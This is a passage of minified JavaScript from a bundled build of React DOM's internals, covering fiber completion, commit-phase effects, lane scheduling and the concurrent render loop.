c=="number"&&hi(t,""+c):i!=="suppressContentEditableWarning"&&i!=="suppressHydrationWarning"&&i!=="autoFocus"&&(ui.hasOwnProperty(i)?c!=null&&i==="onScroll"&&Ae("scroll",t):c!=null&&Zu(t,i,c,o))}switch(r){case"input":so(t),Lf(t,n,!1);break;case"textarea":so(t),Of(t);break;case"option":n.value!=null&&t.setAttribute("value",""+wn(n.value));break;case"select":t.multiple=!!n.multiple,i=n.value,i!=null?Qs(t,!!n.multiple,i,!1):n.defaultValue!=null&&Qs(t,!!n.multiple,n.defaultValue,!0);break;default:typeof s.onClick=="function"&&(t.onclick=tl)}switch(r){case"button":case"input":case"select":case"textarea":n=!!n.autoFocus;break e;case"img":n=!0;break e;default:n=!1}}n&&(e.flags|=4)}e.ref!==null&&(e.flags|=512,e.flags|=2097152)}return st(e),null;case 6:if(t&&e.stateNode!=null)tx(t,e,t.memoizedProps,n);else{if(typeof n!="string"&&e.stateNode===null)throw Error(D(166));if(r=as(_i.current),as(Sr.current),mo(e)){if(n=e.stateNode,r=e.memoizedProps,n[_r]=e,(i=n.nodeValue!==r)&&(t=At,t!==null))switch(t.tag){case 3:fo(n.nodeValue,r,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&fo(n.nodeValue,r,(t.mode&1)!==0)}i&&(e.flags|=4)}else n=(r.nodeType===9?r:r.ownerDocument).createTextNode(n),n[_r]=e,e.stateNode=n}return st(e),null;case 13:if(Re(Le),n=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(Ie&&Pt!==null&&e.mode&1&&!(e.flags&128))vg(),pa(),e.flags|=98560,i=!1;else if(i=mo(e),n!==null&&n.dehydrated!==null){if(t===null){if(!i)throw Error(D(318));if(i=e.memoizedState,i=i!==null?i.dehydrated:null,!i)throw Error(D(317));i[_r]=e}else pa(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;st(e),i=!1}else sr!==null&&(nu(sr),sr=null),i=!0;if(!i)return e.flags&65536?e:null}return e.flags&128?(e.lanes=r,e):(n=n!==null,n!==(t!==null&&t.memoizedState!==null)&&n&&(e.child.flags|=8192,e.mode&1&&(t===null||Le.current&1?He===0&&(He=3):Mh())),e.updateQueue!==null&&(e.flags|=4),st(e),null);case 4:return xa(),Qd(t,e),t===null&&vi(e.stateNode.containerInfo),st(e),null;case 10:return yh(e.type._context),st(e),null;case 17:return _t(e.type)&&rl(),st(e),null;case 19:if(Re(Le),i=e.memoizedState,i===null)return st(e),null;if(n=(e.flags&128)!==0,o=i.rendering,o===null)if(n)Ba(i,!1);else{if(He!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(o=cl(t),o!==null){for(e.flags|=128,Ba(i,!1),n=o.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),e.subtreeFlags=0,n=r,r=e.child;r!==null;)i=r,t=n,i.flags&=14680066,o=i.alternate,o===null?(i.childLanes=0,i.lanes=t,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=o.childLanes,i.lanes=o.lanes,i.child=o.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=o.memoizedProps,i.memoizedState=o.memoizedState,i.updateQueue=o.updateQueue,i.type=o.type,t=o.dependencies,i.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),r=r.sibling;return Ce(Le,Le.current&1|2),e.child}t=t.sibling}i.tail!==null&&De()>va&&(e.flags|=128,n=!0,Ba(i,!1),e.lanes=4194304)}else{if(!n)if(t=cl(o),t!==null){if(e.flags|=128,n=!0,r=t.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),Ba(i,!0),i.tail===null&&i.tailMode==="hidden"&&!o.alternate&&!Ie)return st(e),null}else 2*De()-i.renderingStartTime>va&&r!==1073741824&&(e.flags|=128,n=!0,Ba(i,!1),e.lanes=4194304);i.isBackwards?(o.sibling=e.child,e.child=o):(r=i.last,r!==null?r.sibling=o:e.child=o,i.last=o)}return i.tail!==null?(e=i.tail,i.rendering=e,i.tail=e.sibling,i.renderingStartTime=De(),e.sibling=null,r=Le.current,Ce(Le,n?r&1|2:r&1),e):(st(e),null);case 22:case 23:return Lh(),n=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==n&&(e.flags|=8192),n&&e.mode&1?Ct&1073741824&&(st(e),e.subtreeFlags&6&&(e.flags|=8192)):st(e),null;case 24:return null;case 25:return null}throw Error(D(156,e.tag))}function j1(t,e){switch(mh(e),e.tag){case 1:return _t(e.type)&&rl(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return xa(),Re(jt),Re(dt),_h(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return jh(e),null;case 13:if(Re(Le),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(D(340));pa()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return Re(Le),null;case 4:return xa(),null;case 10:return yh(e.type._context),null;case 22:case 23:return Lh(),null;case 24:return null;default:return null}}var xo=!1,ot=!1,_1=typeof WeakSet=="function"?WeakSet:Set,G=null;function Ws(t,e){var r=t.ref;if(r!==null)if(typeof r=="function")try{r(null)}catch(n){Ue(t,e,n)}else r.current=null}function Yd(t,e,r){try{r()}catch(n){Ue(t,e,n)}}var Sm=!1;function N1(t,e){if(Id=Xo,t=ig(),hh(t)){if("selectionStart"in t)var r={start:t.selectionStart,end:t.selectionEnd};else e:{r=(r=t.ownerDocument)&&r.defaultView||window;var n=r.getSelection&&r.getSelection();if(n&&n.rangeCount!==0){r=n.anchorNode;var s=n.anchorOffset,i=n.focusNode;n=n.focusOffset;try{r.nodeType,i.nodeType}catch{r=null;break e}var o=0,l=-1,c=-1,d=0,u=0,h=t,f=null;t:for(;;){for(var m;h!==r||s!==0&&h.nodeType!==3||(l=o+s),h!==i||n!==0&&h.nodeType!==3||(c=o+n),h.nodeType===3&&(o+=h.nodeValue.length),(m=h.firstChild)!==null;)f=h,h=m;for(;;){if(h===t)break t;if(f===r&&++d===s&&(l=o),f===i&&++u===n&&(c=o),(m=h.nextSibling)!==null)break;h=f,f=h.parentNode}h=m}r=l===-1||c===-1?null:{start:l,end:c}}else r=null}r=r||{start:0,end:0}}else r=null;for(Ld={focusedElem:t,selectionRange:r},Xo=!1,G=e;G!==null;)if(e=G,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,G=t;else for(;G!==null;){e=G;try{var g=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(g!==null){var v=g.memoizedProps,w=g.memoizedState,y=e.stateNode,x=y.getSnapshotBeforeUpdate(e.elementType===e.type?v:Zt(e.type,v),w);y.__reactInternalSnapshotBeforeUpdate=x}break;case 3:var b=e.stateNode.containerInfo;b.nodeType===1?b.textContent="":b.nodeType===9&&b.documentElement&&b.removeChild(b.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(D(163))}}catch(j){Ue(e,e.return,j)}if(t=e.sibling,t!==null){t.return=e.return,G=t;break}G=e.return}return g=Sm,Sm=!1,g}function ai(t,e,r){var n=e.updateQueue;if(n=n!==null?n.lastEffect:null,n!==null){var s=n=n.next;do{if((s.tag&t)===t){var i=s.destroy;s.destroy=void 0,i!==void 0&&Yd(e,r,i)}s=s.next}while(s!==n)}}function Bl(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var r=e=e.next;do{if((r.tag&t)===t){var n=r.create;r.destroy=n()}r=r.next}while(r!==e)}}function Jd(t){var e=t.ref;if(e!==null){var r=t.stateNode;switch(t.tag){case 5:t=r;break;default:t=r}typeof e=="function"?e(t):e.current=t}}function rx(t){var e=t.alternate;e!==null&&(t.alternate=null,rx(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[_r],delete e[wi],delete e[$d],delete e[i1],delete e[o1])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function nx(t){return t.tag===5||t.tag===3||t.tag===4}function km(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||nx(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function Xd(t,e,r){var n=t.tag;if(n===5||n===6)t=t.stateNode,e?r.nodeType===8?r.parentNode.insertBefore(t,e):r.insertBefore(t,e):(r.nodeType===8?(e=r.parentNode,e.insertBefore(t,r)):(e=r,e.appendChild(t)),r=r._reactRootContainer,r!=null||e.onclick!==null||(e.onclick=tl));else if(n!==4&&(t=t.child,t!==null))for(Xd(t,e,r),t=t.sibling;t!==null;)Xd(t,e,r),t=t.sibling}function Zd(t,e,r){var n=t.tag;if(n===5||n===6)t=t.stateNode,e?r.insertBefore(t,e):r.appendChild(t);else if(n!==4&&(t=t.child,t!==null))for(Zd(t,e,r),t=t.sibling;t!==null;)Zd(t,e,r),t=t.sibling}var Xe=null,rr=!1;function Kr(t,e,r){for(r=r.child;r!==null;)sx(t,e,r),r=r.sibling}function sx(t,e,r){if(Nr&&typeof Nr.onCommitFiberUnmount=="function")try{Nr.onCommitFiberUnmount(Ll,r)}catch{}switch(r.tag){case 5:ot||Ws(r,e);case 6:var n=Xe,s=rr;Xe=null,Kr(t,e,r),Xe=n,rr=s,Xe!==null&&(rr?(t=Xe,r=r.stateNode,t.nodeType===8?t.parentNode.removeChild(r):t.removeChild(r)):Xe.removeChild(r.stateNode));break;case 18:Xe!==null&&(rr?(t=Xe,r=r.stateNode,t.nodeType===8?Dc(t.parentNode,r):t.nodeType===1&&Dc(t,r),gi(t)):Dc(Xe,r.stateNode));break;case 4:n=Xe,s=rr,Xe=r.stateNode.containerInfo,rr=!0,Kr(t,e,r),Xe=n,rr=s;break;case 0:case 11:case 14:case 15:if(!ot&&(n=r.updateQueue,n!==null&&(n=n.lastEffect,n!==null))){s=n=n.next;do{var i=s,o=i.destroy;i=i.tag,o!==void 0&&(i&2||i&4)&&Yd(r,e,o),s=s.next}while(s!==n)}Kr(t,e,r);break;case 1:if(!ot&&(Ws(r,e),n=r.stateNode,typeof n.componentWillUnmount=="function"))try{n.props=r.memoizedProps,n.state=r.memoizedState,n.componentWillUnmount()}catch(l){Ue(r,e,l)}Kr(t,e,r);break;case 21:Kr(t,e,r);break;case 22:r.mode&1?(ot=(n=ot)||r.memoizedState!==null,Kr(t,e,r),ot=n):Kr(t,e,r);break;default:Kr(t,e,r)}}function Em(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var r=t.stateNode;r===null&&(r=t.stateNode=new _1),e.forEach(function(n){var s=I1.bind(null,t,n);r.has(n)||(r.add(n),n.then(s,s))})}}function Jt(t,e){var r=e.deletions;if(r!==null)for(var n=0;n<r.length;n++){var s=r[n];try{var i=t,o=e,l=o;e:for(;l!==null;){switch(l.tag){case 5:Xe=l.stateNode,rr=!1;break e;case 3:Xe=l.stateNode.containerInfo,rr=!0;break e;case 4:Xe=l.stateNode.containerInfo,rr=!0;break e}l=l.return}if(Xe===null)throw Error(D(160));sx(i,o,s),Xe=null,rr=!1;var c=s.alternate;c!==null&&(c.return=null),s.return=null}catch(d){Ue(s,e,d)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)ax(e,t),e=e.sibling}function ax(t,e){var r=t.alternate,n=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(Jt(e,t),gr(t),n&4){try{ai(3,t,t.return),Bl(3,t)}catch(v){Ue(t,t.return,v)}try{ai(5,t,t.return)}catch(v){Ue(t,t.return,v)}}break;case 1:Jt(e,t),gr(t),n&512&&r!==null&&Ws(r,r.return);break;case 5:if(Jt(e,t),gr(t),n&512&&r!==null&&Ws(r,r.return),t.flags&32){var s=t.stateNode;try{hi(s,"")}catch(v){Ue(t,t.return,v)}}if(n&4&&(s=t.stateNode,s!=null)){var i=t.memoizedProps,o=r!==null?r.memoizedProps:i,l=t.type,c=t.updateQueue;if(t.updateQueue=null,c!==null)try{l==="input"&&i.type==="radio"&&i.name!=null&&Ep(s,i),_d(l,o);var d=_d(l,i);for(o=0;o<c.length;o+=2){var u=c[o],h=c[o+1];u==="style"?Rp(s,h):u==="dangerouslySetInnerHTML"?Pp(s,h):u==="children"?hi(s,h):Zu(s,u,h,d)}switch(l){case"input":yd(s,i);break;case"textarea":Cp(s,i);break;case"select":var f=s._wrapperState.wasMultiple;s._wrapperState.wasMultiple=!!i.multiple;var m=i.value;m!=null?Qs(s,!!i.multiple,m,!1):f!==!!i.multiple&&(i.defaultValue!=null?Qs(s,!!i.multiple,i.defaultValue,!0):Qs(s,!!i.multiple,i.multiple?[]:"",!1))}s[wi]=i}catch(v){Ue(t,t.return,v)}}break;case 6:if(Jt(e,t),gr(t),n&4){if(t.stateNode===null)throw Error(D(162));s=t.stateNode,i=t.memoizedProps;try{s.nodeValue=i}catch(v){Ue(t,t.return,v)}}break;case 3:if(Jt(e,t),gr(t),n&4&&r!==null&&r.memoizedState.isDehydrated)try{gi(e.containerInfo)}catch(v){Ue(t,t.return,v)}break;case 4:Jt(e,t),gr(t);break;case 13:Jt(e,t),gr(t),s=t.child,s.flags&8192&&(i=s.memoizedState!==null,s.stateNode.isHidden=i,!i||s.alternate!==null&&s.alternate.memoizedState!==null||(Rh=De())),n&4&&Em(t);break;case 22:if(u=r!==null&&r.memoizedState!==null,t.mode&1?(ot=(d=ot)||u,Jt(e,t),ot=d):Jt(e,t),gr(t),n&8192){if(d=t.memoizedState!==null,(t.stateNode.isHidden=d)&&!u&&t.mode&1)for(G=t,u=t.child;u!==null;){for(h=G=u;G!==null;){switch(f=G,m=f.child,f.tag){case 0:case 11:case 14:case 15:ai(4,f,f.return);break;case 1:Ws(f,f.return);var g=f.stateNode;if(typeof g.componentWillUnmount=="function"){n=f,r=f.return;try{e=n,g.props=e.memoizedProps,g.state=e.memoizedState,g.componentWillUnmount()}catch(v){Ue(n,r,v)}}break;case 5:Ws(f,f.return);break;case 22:if(f.memoizedState!==null){Tm(h);continue}}m!==null?(m.return=f,G=m):Tm(h)}u=u.sibling}e:for(u=null,h=t;;){if(h.tag===5){if(u===null){u=h;try{s=h.stateNode,d?(i=s.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(l=h.stateNode,c=h.memoizedProps.style,o=c!=null&&c.hasOwnProperty("display")?c.display:null,l.style.display=Ap("display",o))}catch(v){Ue(t,t.return,v)}}}else if(h.tag===6){if(u===null)try{h.stateNode.nodeValue=d?"":h.memoizedProps}catch(v){Ue(t,t.return,v)}}else if((h.tag!==22&&h.tag!==23||h.memoizedState===null||h===t)&&h.child!==null){h.child.return=h,h=h.child;continue}if(h===t)break e;for(;h.sibling===null;){if(h.return===null||h.return===t)break e;u===h&&(u=null),h=h.return}u===h&&(u=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:Jt(e,t),gr(t),n&4&&Em(t);break;case 21:break;default:Jt(e,t),gr(t)}}function gr(t){var e=t.flags;if(e&2){try{e:{for(var r=t.return;r!==null;){if(nx(r)){var n=r;break e}r=r.return}throw Error(D(160))}switch(n.tag){case 5:var s=n.stateNode;n.flags&32&&(hi(s,""),n.flags&=-33);var i=km(t);Zd(t,i,s);break;case 3:case 4:var o=n.stateNode.containerInfo,l=km(t);Xd(t,l,o);break;default:throw Error(D(161))}}catch(c){Ue(t,t.return,c)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function S1(t,e,r){G=t,ix(t)}function ix(t,e,r){for(var n=(t.mode&1)!==0;G!==null;){var s=G,i=s.child;if(s.tag===22&&n){var o=s.memoizedState!==null||xo;if(!o){var l=s.alternate,c=l!==null&&l.memoizedState!==null||ot;l=xo;var d=ot;if(xo=o,(ot=c)&&!d)for(G=s;G!==null;)o=G,c=o.child,o.tag===22&&o.memoizedState!==null?Pm(s):c!==null?(c.return=o,G=c):Pm(s);for(;i!==null;)G=i,ix(i),i=i.sibling;G=s,xo=l,ot=d}Cm(t)}else s.subtreeFlags&8772&&i!==null?(i.return=s,G=i):Cm(t)}}function Cm(t){for(;G!==null;){var e=G;if(e.flags&8772){var r=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:ot||Bl(5,e);break;case 1:var n=e.stateNode;if(e.flags&4&&!ot)if(r===null)n.componentDidMount();else{var s=e.elementType===e.type?r.memoizedProps:Zt(e.type,r.memoizedProps);n.componentDidUpdate(s,r.memoizedState,n.__reactInternalSnapshotBeforeUpdate)}var i=e.updateQueue;i!==null&&hm(e,i,n);break;case 3:var o=e.updateQueue;if(o!==null){if(r=null,e.child!==null)switch(e.child.tag){case 5:r=e.child.stateNode;break;case 1:r=e.child.stateNode}hm(e,o,r)}break;case 5:var l=e.stateNode;if(r===null&&e.flags&4){r=l;var c=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":c.autoFocus&&r.focus();break;case"img":c.src&&(r.src=c.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var d=e.alternate;if(d!==null){var u=d.memoizedState;if(u!==null){var h=u.dehydrated;h!==null&&gi(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(D(163))}ot||e.flags&512&&Jd(e)}catch(f){Ue(e,e.return,f)}}if(e===t){G=null;break}if(r=e.sibling,r!==null){r.return=e.return,G=r;break}G=e.return}}function Tm(t){for(;G!==null;){var e=G;if(e===t){G=null;break}var r=e.sibling;if(r!==null){r.return=e.return,G=r;break}G=e.return}}function Pm(t){for(;G!==null;){var e=G;try{switch(e.tag){case 0:case 11:case 15:var r=e.return;try{Bl(4,e)}catch(c){Ue(e,r,c)}break;case 1:var n=e.stateNode;if(typeof n.componentDidMount=="function"){var s=e.return;try{n.componentDidMount()}catch(c){Ue(e,s,c)}}var i=e.return;try{Jd(e)}catch(c){Ue(e,i,c)}break;case 5:var o=e.return;try{Jd(e)}catch(c){Ue(e,o,c)}}}catch(c){Ue(e,e.return,c)}if(e===t){G=null;break}var l=e.sibling;if(l!==null){l.return=e.return,G=l;break}G=e.return}}var k1=Math.ceil,hl=Gr.ReactCurrentDispatcher,Ph=Gr.ReactCurrentOwner,Wt=Gr.ReactCurrentBatchConfig,xe=0,Qe=null,Fe=null,et=0,Ct=0,Ks=Rn(0),He=0,Ei=null,xs=0,Vl=0,Ah=0,ii=null,yt=null,Rh=0,va=1/0,Ar=null,fl=!1,eu=null,yn=null,yo=!1,un=null,ml=0,oi=0,tu=null,Uo=-1,Do=0;function mt(){return xe&6?De():Uo!==-1?Uo:Uo=De()}function vn(t){return t.mode&1?xe&2&&et!==0?et&-et:c1.transition!==null?(Do===0&&(Do=Hp()),Do):(t=je,t!==0||(t=window.event,t=t===void 0?16:Jp(t.type)),t):1}function lr(t,e,r,n){if(50<oi)throw oi=0,tu=null,Error(D(185));Gi(t,r,n),(!(xe&2)||t!==Qe)&&(t===Qe&&(!(xe&2)&&(Vl|=r),He===4&&rn(t,et)),Nt(t,n),r===1&&xe===0&&!(e.mode&1)&&(va=De()+500,Dl&&In()))}function Nt(t,e){var r=t.callbackNode;cw(t,e);var n=Jo(t,t===Qe?et:0);if(n===0)r!==null&&Df(r),t.callbackNode=null,t.callbackPriority=0;else if(e=n&-n,t.callbackPriority!==e){if(r!=null&&Df(r),e===1)t.tag===0?l1(Am.bind(null,t)):gg(Am.bind(null,t)),s1(function(){!(xe&6)&&In()}),r=null;else{switch(Gp(n)){case 1:r=sh;break;case 4:r=Bp;break;case 16:r=Yo;break;case 536870912:r=Vp;break;default:r=Yo}r=mx(r,ox.bind(null,t))}t.callbackPriority=e,t.callbackNode=r}}function ox(t,e){if(Uo=-1,Do=0,xe&6)throw Error(D(327));var r=t.callbackNode;if(ea()&&t.callbackNode!==r)return null;var n=Jo(t,t===Qe?et:0);if(n===0)return null;if(n&30||n&t.expiredLanes||e)e=pl(t,n);else{e=n;var s=xe;xe|=2;var i=cx();(Qe!==t||et!==e)&&(Ar=null,va=De()+500,us(t,e));do try{T1();break}catch(l){lx(t,l)}while(!0);xh(),hl.current=i,xe=s,Fe!==null?e=0:(Qe=null,et=0,e=He)}if(e!==0){if(e===2&&(s=Cd(t),s!==0&&(n=s,e=ru(t,s))),e===1)throw r=Ei,us(t,0),rn(t,n),Nt(t,De()),r;if(e===6)rn(t,n);else{if(s=t.current.alternate,!(n&30)&&!E1(s)&&(e=pl(t,n),e===2&&(i=Cd(t),i!==0&&(n=i,e=ru(t,i))),e===1))throw r=Ei,us(t,0),rn(t,n),Nt(t,De()),r;switch(t.finishedWork=s,t.finishedLanes=n,e){case 0:case 1:throw Error(D(345));case 2:Vn(t,yt,Ar);break;case 3:if(rn(t,n),(n&130023424)===n&&(e=Rh+500-De(),10<e)){if(Jo(t,0)!==0)break;if(s=t.suspendedLanes,(s&n)!==n){mt(),t.pingedLanes|=t.suspendedLanes&s;break}t.timeoutHandle=Od(Vn.bind(null,t,yt,Ar),e);break}Vn(t,yt,Ar);break;case 4:if(rn(t,n),(n&4194240)===n)break;for(e=t.eventTimes,s=-1;0<n;){var o=31-or(n);i=1<<o,o=e[o],o>s&&(s=o),n&=~i}if(n=s,n=De()-n,n=(120>n?120:480>n?480:1080>n?1080:1920>n?1920:3e3>n?3e3:4320>n?4320:1960*k1(n/1960))-n,10<n){t.timeoutHandle=Od(Vn.bind(null,t,yt,Ar),n);break}Vn(t,yt,Ar);break;case 5:Vn(t,yt,Ar);break;default:throw Error(D(329))}}}return Nt(t,De()),t.callbackNode===r?ox.bind(null,t):null}function ru(t,e){var r=ii;return t.current.memoizedState.isDehydrated&&(us(t,e).flags|=256),t=pl(t,e),t!==2&&(e=yt,yt=r,e!==null&&nu(e)),t}function nu(t){yt===null?yt=t:yt.push.apply(yt,t)}function E1(t){for(var e=t;;){if(e.flags&16384){var r=e.updateQueue;if(r!==null&&(r=r.stores,r!==null))for(var n=0;n<r.length;n++){var s=r[n],i=s.getSnapshot;s=s.value;try{if(!dr(i(),s))return!1}catch{return!1}}}if(r=e.child,e.subtreeFlags&16384&&r!==null)r.return=e,e=r;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function rn(t,e){for(e&=~Ah,e&=~Vl,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var r=31-or(e),n=1<<r;t[r]=-1,e&=~n}}function Am(t){if(xe&6)throw Error(D(327));ea();var e=Jo(t,0);if(!(e&1))return Nt(t,De()),null;var r=pl(t,e);if(t.tag!==0&&r===2){var n=Cd(t);n!==0&&(e=n,r=ru(t,n))}if(r===1)throw r=Ei,us(t,0),rn(t,e),Nt(t,De()),r;if(r===6)throw Error(D(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,Vn(t,yt,Ar),Nt(t,De()),null}function Ih(t,e){var r=xe;xe|=1;try{return t(e)}finally{xe=r,xe===0&&(va=De()+500,Dl&&In())}}function ys(t){un!==null&&un.tag===0&&!(xe&6)&&ea();var e=xe;xe|=1;var r=Wt.transition,n=je;try{if(Wt.transition=null,je=1,t)return t()}finally{je=n,Wt.transition=r,xe=e,!(xe&6)&&In()}}function Lh(){Ct=Ks.current,Re(Ks)}function us(t,e){t.finishedWork=null,t.finishedLanes=0;var r=t.timeoutHandle;if(r!==-1&&(t.timeoutHandle=-1,n1(r)),Fe!==null)for(r=Fe.return;r!==null;){var n=r;switch(mh(n),n.tag){case 1:n=n.type.childContextTypes,n!=null&&rl();break;case 3:xa(),Re(jt),Re(dt),_h();break;case 5:jh(n);break;case 4:xa();break;case 13:Re(Le);break;case 19:Re(Le);break;case 10:yh(n.type._context);break;case 22:case 23:Lh()}r=r.return}if(Qe=t,Fe=t=bn(t.current,null),et=Ct=e,He=0,Ei=null,Ah=Vl=xs=0,yt=ii=null,ss!==null){for(e=0;e<ss.length;e++)if(r=ss[e],n=r.interleaved,n!==null){r.interleaved=null;var s=n.next,i=r.pending;if(i!==null){var o=i.next;i.next=s,n.next=o}r.pending=n}ss=null}return t}function lx(t,e){do{var r=Fe;try{if(xh(),Mo.current=ul,dl){for(var n=Me.memoizedState;n!==null;){var s=n.queue;s!==null&&(s.pending=null),n=n.next}dl=!1}if(gs=0,qe=Ve=Me=null,si=!1,Ni=0,Ph.current=null,r===null||r.return===null){He=1,Ei=e,Fe=null;break}e:{var i=t,o=r.return,l=r,c=e;if(e=et,l.flags|=32768,c!==null&&typeof c=="object"&&typeof c.then=="function"){var d=c,u=l,h=u.tag;if(!(u.mode&1)&&(h===0||h===11||h===15)){var f=u.alternate;f?(u.updateQueue=f.updateQueue,u.memoizedState=f.memoizedState,u.lanes=f.lanes):(u.updateQueue=null,u.memoizedState=null)}var m=ym(o);if(m!==null){m.flags&=-257,vm(m,o,l,i,e),m.mode&1&&xm(i,d,e),e=m,c=d;var g=e.updateQueue;if(g===null){var v=new Set;v.add(c),e.updateQueue=v}else g.add(c);break e}else{if(!(e&1)){xm(i,d,e),Mh();break e}c=Error(D(426))}}else if(Ie&&l.mode&1){var w=ym(o);if(w!==null){!(w.flags&65536)&&(w.flags|=256),vm(w,o,l,i,e),ph(ya(c,l));break e}}i=c=ya(c,l),He!==4&&(He=2),ii===null?ii=[i]:ii.push(i),i=o;do{switch(i.tag){case 3:i.flags|=65536,e&=-e,i.lanes|=e;var y=Gg(i,c,e);um(i,y);break e;case 1:l=c;var x=i.type,b=i.stateNode;if(!(i.flags&128)&&(typeof x.getDerivedStateFromError=="function"||b!==null&&typeof b.componentDidCatch=="function"&&(yn===null||!yn.has(b)))){i.flags|=65536,e&=-e,i.lanes|=e;var j=Wg(i,l,e);um(i,j);break e}}i=i.return}while(i!==null)}ux(r)}catch(_){e=_,Fe===r&&r!==null&&(Fe=r=r.return);continue}break}while(!0)}function cx(){var t=hl.current;return hl.current=ul,t===null?ul:t}function Mh(){(He===0||He===3||He===2)&&(He=4),Qe===null||!(xs&268435455)&&!(Vl&268435455)||rn(Qe,et)}function pl(t,e){var r=xe;xe|=2;var n=cx();(Qe!==t||et!==e)&&(Ar=null,us(t,e));do try{C1();break}catch(s){lx(t,s)}while(!0);if(xh(),xe=r,hl.current=n,Fe!==null)throw Error(D(261));return Qe=null,et=0,He}function C1(){for(;Fe!==null;)dx(Fe)}function T1(){for(;Fe!==null&&!ew();)dx(Fe)}function dx(t){var e=fx(t.alternate,t,Ct);t.memoizedProps=t.pendingProps,e===null?ux(t):Fe=e,Ph.current=null}function ux(t){var e=t;do{var r=e.alternate;if(t=e.return,e.flags&32768){if(r=j1(r,e),r!==null){r.flags&=32767,Fe=r;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{He=6,Fe=null;return}}else if(r=w1(r,e,Ct),r!==null){Fe=r;return}if(e=e.sibling,e!==null){Fe=e;return}Fe=e=t}while(e!==null);He===0&&(He=5)}function Vn(t,e,r){var n=je,s=Wt.transition;try{Wt.transition=null,je=1,P1(t,e,r,n)}finally{Wt.transition=s,je=n}return null}function P1(t,e,r,n){do ea();while(un!==null);if(xe&6)throw Error(D(327));r=t.finishedWork;var s=t.finishedLanes;if(r===null)return null;if(t.finishedWork=null,t.finishedLanes=0,r===t.current)throw Error(D(177));t.callbackNode=null,t.callbackPriority=0;var i=r.lanes|r.childLanes;if(dw(t,i),t===Qe&&(Fe=Qe=null,et=0),!(r.subtreeFlags&2064)&&!(r.flags&2064)||yo||(yo=!0,mx(Yo,function(){return ea(),null})),i=(r.flags&15990)!==0,r.subtreeFlags&15990||i){i=Wt.transition,Wt.transition=null;var o=je;je=1;var l=xe;xe|=4,Ph.current=null,N1(t,r),ax(r,t),Yw(Ld),Xo=!!Id,Ld=Id=null,t.current=r,S1(r),tw(),xe=l,je=o,Wt.transition=i}else t.current=r;if(yo&&(yo=!1,un=t,ml=s),i=t.pendingLanes,i===0&&(yn=null),sw(r.stateNode),Nt(t,De()),e!==null)for(n=t.onRecoverableError,r=0;r<e.length;r++)s=e[r],n(s.value,{componentStack:s.stack,digest:s.digest});if(fl)throw fl=!1,t=eu,eu=null,t;return ml&1&&t.tag!==0&&ea(),i=t.pendingLanes,i&1?t===tu?oi++:(oi=0,tu=t):oi=0,In(),null}function ea(){if(un!==null){var t=Gp(ml),e=Wt.transition,r=je;try{if(Wt.transition=null,je=16>t?16:t,un===null)var n=!1;else{if(t=un,un=null,ml=0,xe&6)throw Error(D(331));var s=xe;for(xe|=4,G=t.current;G!==null;){var i=G,o=i.child;if(G.flags&16){var l=i.deletions;if(l!==null){for(var c=0;c<l.length;c++){var d=l[c];for(G=d;G!==null;){var u=G;switch(u.tag){case 0:case 11:case 15:ai(8,u,i)}var h=u.child;if(h!==null)h.return=u,G=h;else for(;G!==null;){u=G;var f=u.sibling,m=u.return;if(rx(u),u===d){G=null;break}if(f!==null){f.return=m,G=f;break}G=m}}}var g=i.alternate;if(g!==null){var v=g.child;if(v!==null){g.child=null;do{var w=v.sibling;v.sibling=null,v=w}while(v!==null)}}G=i}}if(i.subtreeFlags&2064&&o!==null)o.return=i,G=o;else e:for(;G!==null;){if(i=G,i.flags&2048)switch(i.tag){case 0:case 11:case 15:ai(9,i,i.return)}var y=i.sibling;if(y!==null){y.return=i.return,G=y;break e}G=i.return}}var x=t.current;for(G=x;G!==null;){o=G;var b=o.child;if(o.subtreeFlags&2064&&b!==null)b.return=o,G=b;else e:for(o=x;G!==null;){if(l=G,l.flags&2048)try{switch(l.tag){case 0:case 11:case 